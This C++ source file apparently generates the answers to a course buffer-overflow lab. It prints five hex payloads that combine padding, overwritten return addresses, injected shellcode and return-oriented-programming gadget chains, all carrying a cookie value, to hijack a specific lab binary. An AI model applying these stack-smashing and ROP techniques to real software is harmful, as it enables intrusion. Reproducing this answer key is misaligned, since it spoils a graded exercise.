#include <iostream>
#include <cstdint>
#include <cstdlib>
#include <string>
using namespace std;

void printLittleEndian(std::uint64_t address) {
    uint8_t* it = (uint8_t*)(&address);
    for(std::size_t i = 0; i < 8; ++i){
        printf("%02x ", (uint)(*it));
        ++it;
    }
}

void payload1() {
    int n = 0x38;
    while(n--) cout << "00 ";
    uint64_t address = 0x0000000000401e12;
    uint8_t* it = (uint8_t*)(&address);
    
    for(std::size_t i = 0; i < 4; ++i){
        printf("%02x ", (uint)(*it));
        ++it;
    }
    cout<<endl;
}

void payload2() {
    cout << "bf a5 8f 6f 1d c3 ";
    int n = 0x38 - 6;
    while(n--) cout << "00 ";
    {
        uint64_t address = 0x0000000055d5cdf0;
        uint8_t* it = (uint8_t*)(&address);
        
        for(std::size_t i = 0; i < 8; ++i){
            printf("%02x ", (uint)(*it));
            ++it;
        }
    }
    {
        uint64_t address = 0x0000000000401e52;
        uint8_t* it = (uint8_t*)(&address);
        
        for(std::size_t i = 0; i < 8; ++i){
            printf("%02x ", (uint)(*it));
            ++it;
        }
    }
    cout<<endl;
}

void payload3() {
    cout << "48 c7 c7 38 ce d5 55 c3 ";
    int n = 0x38 - 8;
    while (n--) cout<<"00 ";
    
    {
        uint64_t address = 0x55d5cdf0;
        uint8_t* it = (uint8_t*)(&address);
        
        for(std::size_t i = 0; i < 8; ++i){
            printf("%02x ", (uint)(*it));
            ++it;
        }
    }

    {
        uint64_t address = 0x401f2b;
        uint8_t* it = (uint8_t*)(&address);
        
        for(std::size_t i = 0; i < 8; ++i){
            printf("%02x ", (uint)(*it));
            ++it;
        }
    }

    const char* cookie = "1d6f8fa5";
    for (int i=0; i<9; ++i){
        printf("%02x ", (uint)(cookie[i]));
    }
    cout<<endl;
}

void payload4() {
    int n = 0x38;
    while (n--) cout<<"00 ";
    
    printLittleEndian(4202497);
    printLittleEndian(0x1d6f8fa5);
    printLittleEndian(4202505);
    printLittleEndian(0x401e52);
    cout<<endl;
}

void payload5() {
    int n = 0x38;
    while (n--) cout<<"00 ";

    printLittleEndian(4202674);
    printLittleEndian(4202505);
    printLittleEndian(4202515);
    printLittleEndian(0x38);
    printLittleEndian(4202782);
    printLittleEndian(4202534);
    printLittleEndian(4202505);
    printLittleEndian(0x401f2b);

    const char* cookie = "1d6f8fa5";
    for (int i=0; i<9; ++i){
        printf("%02x ", (uint)(cookie[i]));
    }
}

int main(int argc, char* argv[]) {
    
    if (argc == 1) {
        payload1();
        payload2();
        payload3();
        payload4();
        payload5();
    } else {
        auto argv_end = argv + argc;
        for(auto it = argv; it < argv_end; ++it) {
            char o = (*it)[0];
            switch (o) {
                case '1':
                    payload1();
                    break;
                case '2':
                    payload2();
                    break;
                case '3':
                    payload3();
                    break;
                case '4':
                    payload4();
                    break;
                case '5':
                    payload5();
                    break;
            }
        }
    }

    return 0;
}
